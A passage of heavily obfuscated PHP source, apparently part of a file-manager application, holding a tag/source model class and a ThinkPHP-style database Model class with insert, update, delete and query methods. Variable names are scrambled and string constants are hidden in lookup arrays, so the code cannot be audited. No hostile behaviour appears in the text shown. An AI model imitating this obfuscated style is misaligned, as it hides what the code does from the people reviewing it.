=> $¥¿á§¦ƒ) { $ºÍ“Ë½ = !0; if (!$Ô²¦ü¸ñ) { $´­Ú©×[] = $Øİ‰¹Ü©; continue; } foreach ($Ô²¦ü¸ñ as $˜‚ò¾î±) { if (!in_array($˜‚ò¾î±, $¥¿á§¦ƒ)) { $ºÍ“Ë½ = !1; break; } } if ($ºÍ“Ë½) { $´­Ú©×[] = $Øİ‰¹Ü©; } } if (!$´­Ú©×) { return array(); } $á•ˆË»î = array($î¾Ç‰ó[503] => array($î¾Ç‰ó[504], $´­Ú©×), $î¾Ç‰ó[583] => $†á‚ïª›, $î¾Ç‰ó[191] => SourceModel::TYPE_GROUP); $ìŞ·¸–µ = Model($î¾Ç‰ó[1435])->listSource($á•ˆË»î); if (!$ìŞ·¸–µ || count($´­Ú©×) == $ìŞ·¸–µ[$î¾Ç‰ó[445]][$î¾Ç‰ó[446]]) { return $ìŞ·¸–µ; } $–“¡Ñ‡„ = array(); $ÉÖ«İÍÀ = array_to_keyvalue($ìŞ·¸–µ[$î¾Ç‰ó[85]], $î¾Ç‰ó[12], $î¾Ç‰ó[194]); $—•—¬Œ‘ = array_to_keyvalue($ìŞ·¸–µ[$î¾Ç‰ó[86]], $î¾Ç‰ó[12], $î¾Ç‰ó[194]); $™œß»¡¢ = array_merge($—•—¬Œ‘, $ÉÖ«İÍÀ); foreach ($´­Ú©× as $¨‘ëñ÷¤) { if (!in_array($¨‘ëñ÷¤, $™œß»¡¢)) { $–“¡Ñ‡„[] = $¨‘ëñ÷¤; } } if ($–“¡Ñ‡„) { $this->removeBySource($†á‚ïª›, $–“¡Ñ‡„); } return $ìŞ·¸–µ; } protected function listData($ÔÆŒÒßì) { $ñšüç =& $_SERVER[ˆö¿ÚÌ¼]; $·ßåùÆ = array($ñšüç[1776] => 0, $ñšüç[571] => array($ñšüç[2105], 0), $ñšüç[508] => $ñšüç[2106] . $ÔÆŒÒßì); $…¸¾ø—­ = $ñšüç[2107]; $‘òŸÕÅ = $this->field($…¸¾ø—­)->where($·ßåùÆ)->order($ñšüç[2108])->select(); return $‘òŸÕÅ ? $‘òŸÕÅ : array(); } protected function addToTag($Ö‰ê¢ö, $­µƒšı‚, $ÌßÊÀĞû) { $ÔµğúéÍ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->getByTagID($Ö‰ê¢ö, $ÌßÊÀĞû) || !$­µƒšı‚) { return !1; } if (!Model($ÔµğúéÍ[915])->pathInfo($­µƒšı‚)) { return !1; } $¢ªÌ„àó = array($ÔµğúéÍ[1776] => 0, $ÔµğúéÍ[571] => $ÌßÊÀĞû, $ÔµğúéÍ[507] => $­µƒšı‚, $ÔµğúéÍ[508] => $ÔµğúéÍ[2109] . $Ö‰ê¢ö, $ÔµğúéÍ[506] => $ÔµğúéÍ[12], $ÔµğúéÍ[1990] => 0); if ($this->where($¢ªÌ„àó)->find()) { return !1; } return $this->add($¢ªÌ„àó); } protected function removeFromTag($—¥¨¼˜§, $ĞöÕõÊ, $çĞ«¿©) { $Ø¤šé•Ê =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->getByTagID($—¥¨¼˜§, $çĞ«¿©) || !$ĞöÕõÊ) { return !1; } if (is_array($ĞöÕõÊ)) { $ĞöÕõÊ = array($Ø¤šé•Ê[7], $ĞöÕõÊ); } $€†û˜£ = array($Ø¤šé•Ê[1776] => 0, $Ø¤šé•Ê[571] => $çĞ«¿©, $Ø¤šé•Ê[508] => $Ø¤šé•Ê[2109] . $—¥¨¼˜§, $Ø¤šé•Ê[507] => $ĞöÕõÊ); return $this->where($€†û˜£)->delete(); } protected function removeByTag($âµÄ¼‚©, $¦ÍØæÃÊ) { $Ù›è‘í =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->getByTagID($âµÄ¼‚©, $¦ÍØæÃÊ)) { return !1; } $‹ã‹œ«‡ = array($Ù›è‘í[1776] => 0, $Ù›è‘í[571] => $¦ÍØæÃÊ, $Ù›è‘í[508] => $Ù›è‘í[2109] . $âµÄ¼‚©); return $this->where($‹ã‹œ«‡)->delete(); } protected function removeBySource($×ÏÙóÁ—, $éÈ§öç„) { $¼ğë÷·ì =& $_SERVER[ˆö¿ÚÌ¼]; if (!$×ÏÙóÁ— || !$éÈ§öç„) { return !1; } if (is_array($éÈ§öç„)) { $éÈ§öç„ = array($¼ğë÷·ì[7], $éÈ§öç„); } $™Æ¡É¶Â = array($¼ğë÷·ì[1776] => 0, $¼ğë÷·ì[507] => $éÈ§öç„, $¼ğë÷·ì[571] => array($¼ğë÷·ì[1105], 0), $¼ğë÷·ì[508] => $¼ğë÷·ì[2109] . $×ÏÙóÁ—); return $this->where($™Æ¡É¶Â)->delete(); } } goto bÈš•º˜ÜÃ; bºÃ²åŠŞØ: define($_SERVER[ˆö¿ÚÌ¼][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\157\162\144\145\x72", "\141\x6c\151\x61\x73", "\150\x61\166\x69\156\x67", "\x67\x72\157\x75\160", "\154\157\143\x6b", "\x64\x69\163\x74\x69\156\x63\164", "\141\x75\x74\x6f", "\146\x69\x6c\164\145\162", "\166\x61\154\151\144\141\x74\x65", "\162\145\x73\165\x6c\164", "\x62\x69\x6e\144", "\164\x6f\x6b\x65\x6e"); public function __construct($ÈÛ”«¢ = '', $ö†„Ô¥ê = '', $™·øŠ = '') { $”§¤–·µ =& $_SERVER[ˆö¿ÚÌ¼]; $this->_initialize(); if (!empty($ÈÛ”«¢)) { if (strpos($ÈÛ”«¢, $”§¤–·µ[10])) { list($this->dbName, $this->name) = explode($”§¤–·µ[10], $ÈÛ”«¢); } else { $this->name = $ÈÛ”«¢; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ö†„Ô¥ê)) { $this->tablePrefix = $”§¤–·µ[12]; } elseif ($”§¤–·µ[12] != $ö†„Ô¥ê) { $this->tablePrefix = $ö†„Ô¥ê; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($”§¤–·µ[324]); } $this->db(0, empty($this->connection) ? $™·øŠ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Áş×’ÓÔ =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($this->fields)) { if (think_config($Áş×’ÓÔ[325])) { $Š€ƒÉ´• = $this->dbName ? $this->dbName : think_config($Áş×’ÓÔ[326]); $àÚä­Õİ = think_var_cache($Áş×’ÓÔ[327] . strtolower(get_path_this($Š€ƒÉ´•) . $Áş×’ÓÔ[10] . $this->name)); if ($àÚä­Õİ) { $ùÓ¾ıø­ = think_config($Áş×’ÓÔ[328]); if (empty($ùÓ¾ıø­) || $àÚä­Õİ[$Áş×’ÓÔ[329]] == $ùÓ¾ıø­) { $this->fields = $àÚä­Õİ; return; } } } $this->flush(); } } public function flush() { $½ËŸ´Ÿ… =& $_SERVER[ˆö¿ÚÌ¼]; $this->db->setModel($this->name); $Æª¹´‚è = $this->db->getFields($this->getTableName()); if (!$Æª¹´‚è) { return !1; } $this->fields = array_keys($Æª¹´‚è); $this->fields[$½ËŸ´Ÿ…[330]] = !1; foreach ($Æª¹´‚è as $úöË©ö => $®Æ×Ë´Ï) { $Îå¸ñÜ±[$úöË©ö] = $®Æ×Ë´Ï[$½ËŸ´Ÿ…[33]]; if ($®Æ×Ë´Ï[$½ËŸ´Ÿ…[39]]) { $this->fields[$½ËŸ´Ÿ…[331]] = $úöË©ö; if ($®Æ×Ë´Ï[$½ËŸ´Ÿ…[42]]) { $this->fields[$½ËŸ´Ÿ…[330]] = !0; } } } $this->fields[$½ËŸ´Ÿ…[332]] = $Îå¸ñÜ±; if (think_config($½ËŸ´Ÿ…[328])) { $this->fields[$½ËŸ´Ÿ…[329]] = think_config($½ËŸ´Ÿ…[328]); } if (think_config($½ËŸ´Ÿ…[325])) { $‚è‚ã‰­ = $this->dbName ? $this->dbName : think_config($½ËŸ´Ÿ…[326]); think_var_cache($½ËŸ´Ÿ…[327] . strtolower(get_path_this($‚è‚ã‰­) . $½ËŸ´Ÿ…[10] . $this->name), $this->fields); } } public function switchModel($Î·¡×˜¼, $²Ã‹‰¾ = array()) { $±ÕÍÕ˜µ =& $_SERVER[ˆö¿ÚÌ¼]; $»¿°Î¾ñ = ucwords(strtolower($Î·¡×˜¼)) . $±ÕÍÕ˜µ[333]; if (!class_exists($»¿°Î¾ñ)) { think_exception($»¿°Î¾ñ . think_lang($±ÕÍÕ˜µ[334])); } $this->_extModel = new $»¿°Î¾ñ($this->name); if (!empty($²Ã‹‰¾)) { foreach ($²Ã‹‰¾ as $ø˜­˜¸‹) { $this->_extModel->setProperty($ø˜­˜¸‹, $this->{$ø˜­˜¸‹}); } } return $this->_extModel; } public function __set($µÅ£ÏŠ×, $¾¼àÇë–) { $this->data[$µÅ£ÏŠ×] = $¾¼àÇë–; } public function __get($Á­¦Ôú) { return isset($this->data[$Á­¦Ôú]) ? $this->data[$Á­¦Ôú] : null; } public function __isset($œà£šğÌ) { return isset($this->data[$œà£šğÌ]); } public function __unset($ü‡¿ÆÒ™) { unset($this->data[$ü‡¿ÆÒ™]); } public function __call($Á«´¾ñå, $Ÿõá¸¾ú) { $Ù¶×ûû§ =& $_SERVER[ˆö¿ÚÌ¼]; if (in_array(strtolower($Á«´¾ñå), $this->methods, !0)) { $this->options[strtolower($Á«´¾ñå)] = $Ÿõá¸¾ú[0]; return $this; } elseif (in_array(strtolower($Á«´¾ñå), array($Ù¶×ûû§[335], $Ù¶×ûû§[336], $Ù¶×ûû§[337], $Ù¶×ûû§[338], $Ù¶×ûû§[339]), !0)) { $ññœ´®Ê = isset($Ÿõá¸¾ú[0]) ? $Ÿõá¸¾ú[0] : $Ù¶×ûû§[223]; $ññœ´®Ê = $this->db->parseKey($ññœ´®Ê); return $this->getField(strtoupper($Á«´¾ñå) . $Ù¶×ûû§[340] . $ññœ´®Ê . $Ù¶×ûû§[341] . $Á«´¾ñå, $Ù¶×ûû§[335]); } elseif (strtolower(substr($Á«´¾ñå, 0, 5)) == $Ù¶×ûû§[342]) { $ññœ´®Ê = think_parse_name(substr($Á«´¾ñå, 5)); $ß‚ûØ®Æ[$ññœ´®Ê] = $Ÿõá¸¾ú[0]; return $this->where($ß‚ûØ®Æ)->find(); } elseif (strtolower(substr($Á«´¾ñå, 0, 10)) == $Ù¶×ûû§[343]) { $‘šÔĞôä = think_parse_name(substr($Á«´¾ñå, 10)); $ß‚ûØ®Æ[$‘šÔĞôä] = $Ÿõá¸¾ú[0]; return $this->where($ß‚ûØ®Æ)->getField($Ÿõá¸¾ú[1]); } elseif (isset($this->_scope[$Á«´¾ñå])) { return $this->scope($Á«´¾ñå, $Ÿõá¸¾ú[0]); } elseif (method_exists($this, $Á«´¾ñå)) { array_unshift($Ÿõá¸¾ú, $Á«´¾ñå); return call_user_func_array(array($this, $Ù¶×ûû§[344]), $Ÿõá¸¾ú); } else { return call_user_func_array(array(parent, $Á«´¾ñå), $Ÿõá¸¾ú); } } protected function call() { $ÊşÃò…’ =& $_SERVER[ˆö¿ÚÌ¼]; $½§ëŞ÷ê = func_get_args(); $ñş´ê = array_shift($½§ëŞ÷ê); $œ†Ã©†Á = $ñş´ê; if (is_array($ñş´ê)) { $œ†Ã©†Á = $ñş´ê[1]; $ñş´ê = $ñş´ê[0]; } $¯®Âà = count($½§ëŞ÷ê) - 1; if (isset($½§ëŞ÷ê[$¯®Âà]) && $½§ëŞ÷ê[$¯®Âà] === $ñş´ê) { think_exception(__CLASS__ . $ÊşÃò…’[4] . $ñş´ê . think_lang($ÊşÃò…’[345])); return; } $½§ëŞ÷ê[] = $ñş´ê; if (method_exists($this, $ÊşÃò…’[346])) { $Á——ùÀ¿ = call_user_func_array(array($this, $ÊşÃò…’[347]), array($œ†Ã©†Á, $½§ëŞ÷ê)); if (!is_null($Á——ùÀ¿) && $Á——ùÀ¿ !== !1) { return $Á——ùÀ¿; } } $ë€â¦‚ì = call_user_func_array(array($this, $ñş´ê), $½§ëŞ÷ê); if (method_exists($this, $ÊşÃò…’[348])) { $Á——ùÀ¿ = call_user_func_array(array($this, $ÊşÃò…’[349]), array($œ†Ã©†Á, $½§ëŞ÷ê, $ë€â¦‚ì)); if ($Á——ùÀ¿) { return $Á——ùÀ¿; } } return $ë€â¦‚ì; } protected function _initialize() { } protected function _facade($ÀâÊá«Ÿ) { $«¿àûŸ =& $_SERVER[ˆö¿ÚÌ¼]; if (!empty($this->fields)) { foreach ($ÀâÊá«Ÿ as $Ê„î¤íô => $Ù§ÍÜ“û) { if (is_array($this->fields) && !in_array($Ê„î¤íô, $this->fields, !0)) { unset($ÀâÊá«Ÿ[$Ê„î¤íô]); } elseif (is_scalar($Ù§ÍÜ“û)) { $this->_parseType($ÀâÊá«Ÿ, $Ê„î¤íô); } } } if (!empty($this->options[$«¿àûŸ[350]])) { $ÀâÊá«Ÿ = array_map($this->options[$«¿àûŸ[350]], $ÀâÊá«Ÿ); unset($this->options[$«¿àûŸ[350]]); } $this->_beforeWrite($ÀâÊá«Ÿ); return $ÀâÊá«Ÿ; } protected function _beforeWrite(&$’ñÍ¦Åä) { } public function add($ü÷Ö£ãê = '', $¿ÕÄ³¶  = array(), $¡£‹‘øŸ = false) { if (empty($ü÷Ö£ãê)) { if (!empty($this->data)) { $ü÷Ö£ãê = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ˆö¿ÚÌ¼][351]); return !1; } } $¿ÕÄ³¶  = $this->_parseOptions($¿ÕÄ³¶ ); $ü÷Ö£ãê = $this->_facade($ü÷Ö£ãê); if (!1 === $this->_beforeInsert($ü÷Ö£ãê, $¿ÕÄ³¶ )) { return !1; } $Ô‚ÒÄÃÛ = $this->db->insert($ü÷Ö£ãê, $¿ÕÄ³¶ , $¡£‹‘øŸ); if (!1 !== $Ô‚ÒÄÃÛ) { $ğ¸ÔŠÙ = $this->getLastInsID(); if ($ğ¸ÔŠÙ) { $ü÷Ö£ãê[$this->getPk()] = $ğ¸ÔŠÙ; $this->_after_insert($ü÷Ö£ãê, $¿ÕÄ³¶ ); return $ğ¸ÔŠÙ; } $this->_after_insert($ü÷Ö£ãê, $¿ÕÄ³¶ ); } return $Ô‚ÒÄÃÛ; } protected function _beforeInsert(&$½ÏÛïÑ”, $÷Ÿ„‡‘ğ) { } protected function _after_insert($íâÍµ¬‡, $¼Î­¯¬) { } public function addAll($ûâ¢Ûş, $ë¿‡²«… = array(), $ÑµĞ‚‹¯ = false) { $ÓËä·Ò› =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($ûâ¢Ûş)) { $this->error = think_lang($ÓËä·Ò›[351]); return !1; } $ë¿‡²«… = $this->_parseOptions($ë¿‡²«…); foreach ($ûâ¢Ûş as $ãØğ¬ÎÏ => $Ğ¹üÏì§) { $ûâ¢Ûş[$ãØğ¬ÎÏ] = $this->_facade($Ğ¹üÏì§); } if (method_exists($this->db, $ÓËä·Ò›[352])) { $›à§çÂ = $this->db->insertAll($ûâ¢Ûş, $ë¿‡²«…, $ÑµĞ‚‹¯); } else { $this->startTrans(); foreach ($ûâ¢Ûş as $ãØğ¬ÎÏ => $Ğ¹üÏì§) { $›à§çÂ = $this->db->insert($Ğ¹üÏì§, $ë¿‡²«…, $ÑµĞ‚‹¯); } $this->commit(); } if (!1 !== $›à§çÂ) { $‚Øöå»« = $this->getLastInsID(); if ($‚Øöå»«) { return $‚Øöå»«; } } return $›à§çÂ; } public function selectAdd($ô®Üö™ = '', $òüÎ±ø‘ = '', $†ÖêËÔÁ = array()) { $ÍÈé³ï  =& $_SERVER[ˆö¿ÚÌ¼]; $†ÖêËÔÁ = $this->_parseOptions($†ÖêËÔÁ); if (!1 === ($âµéØéË = $this->db->selectInsert($ô®Üö™ ? $ô®Üö™ : $†ÖêËÔÁ[$ÍÈé³ï [353]], $òüÎ±ø‘ ? $òüÎ±ø‘ : $this->getTableName(), $†ÖêËÔÁ))) { $this->error = think_lang($ÍÈé³ï [354]); return !1; } else { return $âµéØéË; } } public function save($‹²Ç‚®š = '', $é¡ê¬Îª = array()) { $ ³Ô°î =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($‹²Ç‚®š)) { if (!empty($this->data)) { $‹²Ç‚®š = $this->data; $this->data = array(); } else { $this->error = think_lang($ ³Ô°î[351]); return !1; } } $‹²Ç‚®š = $this->_facade($‹²Ç‚®š); $é¡ê¬Îª = $this->_parseOptions($é¡ê¬Îª); $ğæéßü = $this->getPk(); if (!isset($é¡ê¬Îª[$ ³Ô°î[355]])) { if (isset($‹²Ç‚®š[$ğæéßü])) { $¶àÏí[$ğæéßü] = $‹²Ç‚®š[$ğæéßü]; $é¡ê¬Îª[$ ³Ô°î[355]] = $¶àÏí; unset($‹²Ç‚®š[$ğæéßü]); } else { $this->error = think_lang($ ³Ô°î[354]); return !1; } } if (is_array($é¡ê¬Îª[$ ³Ô°î[355]]) && isset($é¡ê¬Îª[$ ³Ô°î[355]][$ğæéßü])) { $ì¥”Ã§ˆ = $é¡ê¬Îª[$ ³Ô°î[355]][$ğæéßü]; } if (!1 === $this->_beforeUpdate($‹²Ç‚®š, $é¡ê¬Îª)) { return !1; } $ÊéæÒ«” = $this->db->update($‹²Ç‚®š, $é¡ê¬Îª); if (!1 !== $ÊéæÒ«”) { if (isset($ì¥”Ã§ˆ)) { $‹²Ç‚®š[$ğæéßü] = $ì¥”Ã§ˆ; } $this->_afterUpdate($‹²Ç‚®š, $é¡ê¬Îª); } return $ÊéæÒ«”; } protected function _beforeUpdate(&$¹ºô³âŞ, $––¹ôŒ) { } protected function _afterUpdate($Ëü„˜, $îê˜‹ë½) { } public function delete($Ìâ­Õ÷ = array()) { $¬åÒµîË =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($Ìâ­Õ÷) && empty($this->options[$¬åÒµîË[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $–¿â“Âª = $this->getPk(); if (is_numeric($Ìâ­Õ÷) || is_string($Ìâ­Õ÷)) { if (strpos($Ìâ­Õ÷, $¬åÒµîË[50])) { $®Œæ›ì[$–¿â“Âª] = array($¬åÒµîË[356], $Ìâ­Õ÷); } else { $®Œæ›ì[$–¿â“Âª] = $Ìâ­Õ÷; } $this->options[$¬åÒµîË[355]] = $®Œæ›ì; } $Ìâ­Õ÷ = $this->_parseOptions(); if (is_array($Ìâ­Õ÷[$¬åÒµîË[355]]) && isset($Ìâ­Õ÷[$¬åÒµîË[355]][$–¿â“Âª])) { $°€³ÁÕ‰ = $Ìâ­Õ÷[$¬åÒµîË[355]][$–¿â“Âª]; } $˜Ñı Ôİ = $this->db->delete($Ìâ­Õ÷); if (!1 !== $˜Ñı Ôİ) { $ó†ş¾˜ğ = array(); if (isset($°€³ÁÕ‰)) { $ó†ş¾˜ğ[$–¿â“Âª] = $°€³ÁÕ‰; } $this->_after_delete($ó†ş¾˜ğ, $Ìâ­Õ÷); } return $˜Ñı Ôİ; } protected function _after_delete($Ú‚£á®Ø, $É²¥ÍÚ) { } public function select($Æ¢€íÂç = array()) { $‹ò®«Üá =& $_SERVER[ˆö¿ÚÌ¼]; if (is_string($Æ¢€íÂç) || is_numeric($Æ¢€íÂç)) { $ª³¢¯‘• = $this->getPk(); if (strpos($Æ¢€íÂç, $‹ò®«Üá[50])) { $ˆ¢Šùşõ[$ª³¢¯‘•] = array($‹ò®«Üá[356], $Æ¢€íÂç); } else { $ˆ¢Šùşõ[$ª³¢¯‘•] = $Æ¢€íÂç; } $this->options[$‹ò®«Üá[355]] = $ˆ¢Šùşõ; } elseif (!1 === $Æ¢€íÂç) { $Æ¢€íÂç = $this->_parseOptions(); return $‹ò®«Üá[357] . $this->db->buildSelectSql($Æ¢€íÂç) . $‹ò®«Üá[358]; } $Æ¢€íÂç = $this->_parseOptions(); $¯ˆ…·¾Ö = $this->db->select($Æ¢€íÂç); if (!1 === $¯ˆ…·¾Ö) { return !1; } if (empty($¯ˆ…·¾Ö)) { return null; } $this->_afterSelect($¯ˆ…·¾Ö, $Æ¢€íÂç); return $¯ˆ…·¾Ö; } protected function _afterSelect(&$¬ü÷ÚÂƒ, $ÑÂ¹Ñ“ƒ) { } public function buildSql($Š†„‡Í = array()) { $¥ Şõ“ =& $_SERVER[ˆö¿ÚÌ¼]; $Š†„‡Í = $this->_parseOptions($Š†„‡Í); return $¥ Şõ“[357] . $this->db->buildSelectSql($Š†„‡Í) . $¥ Şõ“[358]; } public function optionsValue($Òµ¤éº = null) { if (is_null($Òµ¤éº)) { return $this->options; } elseif (is_array($Òµ¤éº)) { $this->options = array_merge($this->options, $Òµ¤éº); } } protected function _parseOptions($ˆ‡úªŞ£ = array()) { $¿×Ğ‹À® =& $_SERVER[ˆö¿ÚÌ¼]; if (is_array($ˆ‡úªŞ£)) { $ˆ‡úªŞ£ = array_merge($this->options, $ˆ‡úªŞ£); } $this->options = array(); if (!isset($ˆ‡úªŞ£[$¿×Ğ‹À®[359]])) { $ˆ‡úªŞ£[$¿×Ğ‹À®[359]] = $this->getTableName(); $öéŒŒñš = $this->fields; } else { $öéŒŒñš = $this->getDbFields(); } if (!empty($ˆ‡úªŞ£[$¿×Ğ‹À®[360]])) { $ˆ‡úªŞ£[$¿×Ğ‹À®[359]] .= $¿×Ğ‹À®[53] . $ˆ‡úªŞ£[$¿×Ğ‹À®[360]]; } $ˆ‡úªŞ£[$¿×Ğ‹À®[361]] = $this->name; if (isset($ˆ‡úªŞ£[$¿×Ğ‹À®[355]]) && is_array($ˆ‡úªŞ£[$¿×Ğ‹À®[355]]) && !empty($öéŒŒñš) && !isset($ˆ‡úªŞ£[$¿×Ğ‹À®[362]]) && !isset($ˆ‡úªŞ£[$¿×Ğ‹À®[359]])) { foreach ($ˆ‡úªŞ£[$¿×Ğ‹À®[355]] as $›Â€Ïéà => $Ö¿ÃÔ¯Ä) { $›Â€Ïéà = trim($›Â€Ïéà); if (in_array($›Â€Ïéà, $öéŒŒñš, !0)) { if (is_scalar($Ö¿ÃÔ¯Ä)) { $this->_parseType($ˆ‡úªŞ£[$¿×Ğ‹À®[355]], $›Â€Ïéà); } } elseif (!is_numeric($›Â€Ïéà) && $¿×Ğ‹À®[11] != substr($›Â€Ïéà, 0, 1) && !1 === strpos($›Â€Ïéà, $¿×Ğ‹À®[10]) && !1 === strpos($›Â€Ïéà, $¿×Ğ‹À®[340]) && !1 === strpos($›Â€Ïéà, $¿×Ğ‹À®[215]) && !1 === strpos($›Â€Ïéà, $¿×Ğ‹À®[287])) { unset($ˆ‡úªŞ£[$¿×Ğ‹À®[355]][$›Â€Ïéà]); } } } $this->_options_filter($ˆ‡úªŞ£); return $ˆ‡úªŞ£; } protected function _options_filter(&$®¤³Æ¤Š) { } protected function _parseType(&$´Õ÷µÅ, $µÓíÙğ) { $í“µË =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($this->options[$í“µË[363]][$í“µË[4] . $µÓíÙğ])) { $îşÉÉ = strtolower($this->fields[$í“µË[332]][$µÓíÙğ]); if (!1 !== strpos($îşÉÉ, $í“µË[364])) { } elseif (!1 === strpos($îşÉÉ, $í“µË[365]) && !1 !== strpos($îşÉÉ, $í“µË[366])) { $´Õ÷µÅ[$µÓíÙğ] = intval($´Õ÷µÅ[$µÓíÙğ]); } elseif (!1 !== strpos($îşÉÉ, $í“µË[367]) || !1 !== strpos($îşÉÉ, $í“µË[368])) { $´Õ÷µÅ[$µÓíÙğ] = floatval($´Õ÷µÅ[$µÓíÙğ]); } elseif (!1 !== strpos($îşÉÉ, $í“µË[369])) { $´Õ÷µÅ[$µÓíÙğ] = (bool) $´Õ÷µÅ[$µÓíÙğ]; } } } public function find($Ñ¯ÌÁç¢ = array()) { $–ù·ÙÒ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_numeric($Ñ¯ÌÁç¢) || is_string($Ñ¯ÌÁç¢)) { $Å¥…ïú¾[$this->getPk()] = intval($Ñ¯ÌÁç¢); $this->options[$–ù·ÙÒ[355]] = $Å¥…ïú¾; } $this->options[$–ù·ÙÒ[370]] = 1; $Ñ¯ÌÁç¢ = $this->_parseOptions(); $´ÎŸÁÛù = $this->db->select($Ñ¯ÌÁç¢); if (!1 === $´ÎŸÁÛù) { return !1; } if (empty($´ÎŸÁÛù)) { return null; } $this->data = $´ÎŸÁÛù[0]; $this->_afterFind($this->data, $Ñ¯ÌÁç¢); if (!empty($this->options[$–ù·ÙÒ[371]])) { return $this->returnResult($this->data, $this->options[$–ù·ÙÒ[371]]); } return $this->data; } protected function _afterFind(&$‰îƒéĞ¸, $Ù•Šà´ˆ) { } protected function returnResult($å·ëŠß·, $»¥‡•á· = '') { $÷Üıñßò =& $_SERVER[ˆö¿ÚÌ¼]; if ($»¥‡•á·) { if (is_callable($»¥‡•á·)) { return call_user_func($»¥‡•á·, $å·ëŠß·); } switch (strtolower($»¥‡•á·)) { case $÷Üıñßò[372]: return json_encode($å·ëŠß·); case $÷Üıñßò[373]: return xml_encode($å·ëŠß·); } } return $å·ëŠß·; } public function parseFieldsMap($­¢¼ìÃÔ, $Èˆ‘…ÆÇ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $•Ê­×ã => $ß‡¨˜) { if ($Èˆ‘…ÆÇ == 1) { if (isset($­¢¼ìÃÔ[$ß‡¨˜])) { $­¢¼ìÃÔ[$•Ê­×ã] = $­¢¼ìÃÔ[$ß‡¨˜]; unset($­¢¼ìÃÔ[$ß‡¨˜]); } } else { if (isset($­¢¼ìÃÔ[$•Ê­×ã])) { $­¢¼ìÃÔ[$ß‡¨˜] = $­¢¼ìÃÔ[$•Ê­×ã]; unset($­¢¼ìÃÔ[$•Ê­×ã]); } } } } return $­¢¼ìÃÔ; } public function setField($ÁÒƒ›¬, $ı„ÙÍå = '') { if (is_array($ÁÒƒ›¬)) { $ÉƒÀÃ“ = $ÁÒƒ›¬; } else { $ÉƒÀÃ“[$ÁÒƒ›¬] = $ı„ÙÍå; } return $this->save($ÉƒÀÃ“); } public function setAdd($Şü€ó É, $Ó“¦ ¤§ = 1) { $ï«õòşŞ =& $_SERVER[ˆö¿ÚÌ¼]; $£á‰Ìü¹ = $Şü€ó É . $ï«õòşŞ[374] . $Ó“¦ ¤§; if ($Ó“¦ ¤§ < 0) { $£á‰Ìü¹ = $Şü€ó É . $Ó“¦ ¤§; } return $this->setField($Şü€ó É, array($ï«õòşŞ[375], $£á‰Ìü¹)); } public function getField($‚³¡©Ì©, $ÕÂ±âÛ¸ = null) { $¦Ùõ¦¦· =& $_SERVER[ˆö¿ÚÌ¼]; $Ñ¶‚€˜ß[$¦Ùõ¦¦·[353]] = $‚³¡©Ì©; $Ñ¶‚€˜ß = $this->_parseOptions($Ñ¶‚€˜ß); $‚³¡©Ì© = trim($‚³¡©Ì©); if (strpos($‚³¡©Ì©, $¦Ùõ¦¦·[50])) { if (!isset($Ñ¶‚€˜ß[$¦Ùõ¦¦·[370]])) { $Ñ¶‚€˜ß[$¦Ùõ¦¦·[370]] = is_numeric($ÕÂ±âÛ¸) ? $ÕÂ±âÛ¸ : $¦Ùõ¦¦·[12]; } $èã±‡—• = $this->db->select($Ñ¶‚€˜ß); if (!empty($èã±‡—•)) { $˜³ÓÂÓ = explode($¦Ùõ¦¦·[50], $‚³¡©Ì©); $‚³¡©Ì© = array_keys($èã±‡—•[0]); $´½Ö¥ë­ = array_shift($‚³¡©Ì©); $ê§›ŒãÓ = array_shift($‚³¡©Ì©); $£òÖ«å® = array(); $‘Ì¢¸÷å = count($˜³ÓÂÓ); foreach ($èã±‡—• as $ï£ôÍÚÏ) { $Ÿüğóú’ = $ï£ôÍÚÏ[$´½Ö¥ë­]; if (2 == $‘Ì¢¸÷å) { $£òÖ«å®[$Ÿüğóú’] = $ï£ôÍÚÏ[$ê§›ŒãÓ]; } else { $£òÖ«å®[$Ÿüğóú’] = is_string($ÕÂ±âÛ¸) ? implode($ÕÂ±âÛ¸, $ï£ôÍÚÏ) : $ï£ôÍÚÏ; } } return $£òÖ«å®; } } else { if (!0 !== $ÕÂ±âÛ¸) { $Ñ¶‚€˜ß[$¦Ùõ¦¦·[370]] = is_numeric($ÕÂ±âÛ¸) ? $ÕÂ±âÛ¸ : 1; } if ($ÕÂ±âÛ¸ === $¦Ùõ¦¦·[335]) { unset($Ñ¶‚€˜ß[$¦Ùõ¦¦·[370]]); } $ï£ôÍÚÏ = $this->db->select($Ñ¶‚€˜ß); if (!empty($ï£ôÍÚÏ)) { if ($ÕÂ±âÛ¸ === $¦Ùõ¦¦·[335]) { return reset($ï£ôÍÚÏ[0]); } if (!0 !== $ÕÂ±âÛ¸ && 1 == $Ñ¶‚€˜ß[$¦Ùõ¦¦·[370]]) { return reset($ï£ôÍÚÏ[0]); } foreach ($ï£ôÍÚÏ as $Ãô‹¡¹) { $ÆüÀßª[] = $Ãô‹¡¹[$‚³¡©Ì©]; } return $ÆüÀßª; } } return null; } public function create($×é’õ°£ = '', $³ãßº…š = '') { $ÊñÊ¸½Ò =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($×é’õ°£)) { $×é’õ°£ = $_POST; } elseif (is_object($×é’õ°£)) { $×é’õ°£ = get_object_vars($×é’õ°£); } if (empty($×é’õ°£) || !is_array($×é’õ°£)) { $this->error = think_lang($ÊñÊ¸½Ò[351]); return 